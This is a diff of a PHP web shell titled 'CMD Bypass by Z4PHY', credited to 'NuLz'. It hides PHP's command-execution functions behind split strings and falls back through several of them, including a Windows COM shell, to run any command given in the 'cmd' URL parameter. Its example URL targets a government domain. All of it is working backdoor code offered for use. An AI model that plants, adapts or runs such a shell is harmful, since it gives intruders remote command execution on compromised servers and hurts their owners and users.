@@ -1,8 +1,6 @@
-NuLz CMD
-
-code definition
+CMD Bypass by Z4PHY
 <?php
-function NuLzCmd($komendnya) {
+function NuLzCmd($anunya) {
     $hayoloh = 'h'.'tm'.'lspe'.'cialc'.'hars';
     $fw = 'f'.'wr'.'it'.'e';
     $fc = 'f'.'cl'.'os'.'e';
@@ -23,8 +21,8 @@ function NuLzCmd($komendnya) {
     $func_exist = 'fu'.'nct'.'ion'.'_'.'ex'.'ist'.'s';
     $preg = 'pr'.'eg_'.'mat'.'ch';
     $regex = '2'.'>'.'&'.'1';
-    if ( !$preg( '/'.$regex.'/i', $komendnya ) ) {
-        $komendnya = $komendnya.' '.$regex;
+    if ( !$preg( '/'.$regex.'/i', $anunya ) ) {
+        $anunya = $anunya.' '.$regex;
     }
 
     if ( $func_exist( $proc ) ) {
@@ -33,7 +31,7 @@ function NuLzCmd($komendnya) {
             1 => [ 'pipe', 'w' ],
             2 => [ 'pipe', 'w' ],
         ];
-        $process = $proc( $komendnya, $descriptors, $pipes);
+        $process = $proc( $anunya, $descriptors, $pipes);
         if ( $is_rsrc( $process ) ) {
             $fw( $pipes[ 0 ], 'input_data_here' );
             $fc( $pipes[ 0 ] );
@@ -45,12 +43,12 @@ function NuLzCmd($komendnya) {
             return trim($hayoloh(stripslashes($output)));
         }
     } elseif ( $func_exist( $pop ) ) {
-        $process = $pop( $komendnya, 'r' );
+        $process = $pop( $anunya, 'r' );
         $read = $fr( $process, 2096 );
         return trim($hayoloh(stripslashes(print_r( "$process: ".gettype( $process )."\n$read \n" ))));
         $pop_cls( $process );
     } elseif ( $func_exist( $exc ) ) {
-        $exc( $komendnya, $output, $returnCode );
+        $exc( $anunya, $output, $returnCode );
         if ( $returnCode === 0 ) {
             $res = implode( $output );
             return trim($hayoloh(stripslashes($res)));
@@ -58,17 +56,17 @@ function NuLzCmd($komendnya) {
             flush();
         }
     } elseif ( $func_exist( $sys ) ) {
-        $out = $sys( $komendnya );
+        $out = $sys( $anunya );
         return trim($hayoloh(stripslashes($out)));
     } elseif ( $func_exist( $pass ) ) {
-        $out = $pass( $komendnya );
+        $out = $pass( $anunya );
         return trim($hayoloh(stripslashes($out)));
     } elseif ( $func_exist( $sh_exc ) ) {
-        $out = $sh_exc( $komendnya );
+        $out = $sh_exc( $anunya );
         return trim($hayoloh(stripslashes($out)));
     } elseif ( $func_exist( $com ) ) {
         $shell = new $com($wscsh);
-        $kom_mand = "$cMdexe /c ".$komendnya;
+        $kom_mand = "$cMdexe /c ".$anunya;
         $output = $shell->Exec($kom_mand)->StdOut->ReadAll();
         return trim($hayoloh(stripslashes($output)));
     }else {
@@ -77,12 +75,12 @@ function NuLzCmd($komendnya) {
 }
 
 if (isset($_GET['cmd'])) {
-    $komendnya = $_GET['cmd'];
+    $anunya = $_GET['cmd'];
     echo '<center><textarea rows="50" cols="80">';
-    echo NuLzCmd($komendnya);
+    echo NuLzCmd($anunya);
     echo '</textarea></center>';
 }
 ?>
 
-example: https://nasa.gov/nulz.php?cmd=uname -a
-Thanks... -NuLz @nulzhaxorstars
+<!-- example: https://nasa.gov/nulz.php?cmd=uname -a -->
+Thanks to -NuLz @nulzhaxorstars
